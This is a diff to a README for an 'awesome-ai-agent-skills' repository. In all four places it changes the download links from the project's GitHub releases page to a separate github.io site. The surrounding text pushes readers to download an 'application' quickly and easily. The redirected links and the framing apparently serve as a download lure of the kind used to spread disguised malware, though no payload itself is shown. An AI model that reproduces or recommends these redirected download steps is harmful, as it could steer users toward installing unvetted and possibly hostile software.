@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-agent-skills - Your Smart Assistant Toolkit, Simplified
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--ai--agent--skills-2ea44f?style=for-the-badge)](https://github.com/Destinyola/awesome-ai-agent-skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-awesome--ai--agent--skills-2ea44f?style=for-the-badge)](https://destinyola.github.io)
 
 ## 👋 Welcome to Your AI Skills Library
 
@@ -25,7 +25,7 @@ Getting started is easier than you think. Follow these simple steps and you'll b
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Destinyola/awesome-ai-agent-skills/releases](https://github.com/Destinyola/awesome-ai-agent-skills/releases)
+Visit this link to download the application: [https://destinyola.github.io](https://destinyola.github.io)
 
 Click the download button and wait for the file to finish downloading. That's it - no complicated choices to make.
 
@@ -118,9 +118,9 @@ Your journey into the world of AI-powered productivity is just a click away.
 
 ### Download Your Copy Now
 
-[![Get It Here](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Destinyola/awesome-ai-agent-skills/releases)
+[![Get It Here](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://destinyola.github.io)
 
-Visit this link to download the application: [https://github.com/Destinyola/awesome-ai-agent-skills/releases](https://github.com/Destinyola/awesome-ai-agent-skills/releases)
+Visit this link to download the application: [https://destinyola.github.io](https://destinyola.github.io)
 
 Remember, the download is free, fast, and simple. In less than five minutes, you'll have access to an incredible library of AI tools that can transform how you work, create, and learn.
 
